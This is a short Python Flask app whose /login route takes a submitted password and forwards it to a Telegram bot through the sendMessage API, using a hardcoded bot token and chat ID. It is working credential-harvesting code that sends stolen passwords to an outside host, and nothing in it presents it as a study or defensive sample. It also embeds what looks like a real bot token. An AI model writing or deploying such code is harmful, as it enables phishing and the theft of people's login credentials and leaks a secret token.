from flask import Flask, request
import requests
from Dsend import get 

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    chat_id = "1663788795"
    token = "6583320212:AAErFlhIYmA0Je36piZCnXa_C48Jl31-PCk"
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={password}"
    get(url,print_text=True)
    return "Password sent to Telegram"

if __name__ == "__main__":
    app.run(debug=True)
